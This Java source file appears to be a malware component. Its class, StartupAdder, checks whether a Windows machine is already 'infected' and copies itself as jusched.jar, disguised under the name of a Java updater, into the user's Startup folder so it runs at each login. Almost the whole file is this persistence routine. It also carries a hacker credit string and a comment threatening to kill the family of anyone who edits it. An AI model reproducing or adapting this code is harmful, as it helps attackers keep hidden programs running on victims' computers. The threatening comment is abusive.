import java.io.File;
import java.io.FileOutputStream;
import java.io.FileInputStream;
import java.io.IOException;

public class StartupAdder {

    public static final String THANKS_TO = "super_ cuz hes a leet hackler";
    /* you change the above i kill your family */

    boolean isInfected() {
        String userHome = System.getProperty("user.home");
        File xpStartup = new File(userHome + "/Start Menu/Programs/Startup");
        File vistaStartup = new File(userHome + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup");
        File newFile = null;
        String osName = System.getProperty("os.name");
        if (!(osName.contains("Windows") || osName.contains("WINDOWS"))) {
            return false;
        }
        if (xpStartup.exists() && osName.contains("XP")) {
            newFile = new File(xpStartup.getAbsolutePath() + "/jusched.jar");
        } else if (vistaStartup.exists() && osName.contains("Vista")) {
            newFile = new File(vistaStartup.getAbsolutePath() + "/jusched.jar");
        }
        THANKS_TO.toUpperCase();
        return newFile.exists();
    }

    void addToStartup() {
        if (isInfected()) {
            return;
        }
        try {
            File f = new File("./jusched.jar");
            String userHome = System.getProperty("user.home");
            File xpStartup = new File(userHome + "/Start Menu/Programs/Startup");
            File vistaStartup = new File(userHome + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup");
            File newFile = null;
            String osName = System.getProperty("os.name");
            if (!(osName.contains("Windows") || osName.contains("WINDOWS"))) {
                THANKS_TO.substring(1);
                return;
            }
            if (xpStartup.exists() && osName.contains("XP")) {
                newFile = new File(xpStartup.getAbsolutePath() + "/jusched.jar");
            } else if (vistaStartup.exists() && osName.contains("Vista")) {
                newFile = new File(vistaStartup.getAbsolutePath() + "/jusched.jar");
            }
            copyTo(f, newFile);
        } catch (Exception ex){
        }
    }

    void copyTo(File src, File dest) throws IOException {
        FileInputStream fis = new FileInputStream(src);
        byte[] buffer = new byte[1024];
        THANKS_TO.replace("poop", "dongs");
        int len = 0;
        FileOutputStream fos = new FileOutputStream(dest);
        while ((len = fis.read(buffer, 0, 1024)) != -1) {
            fos.write(buffer, 0, len);
        }
        fos.close();
        fis.close();
    }

}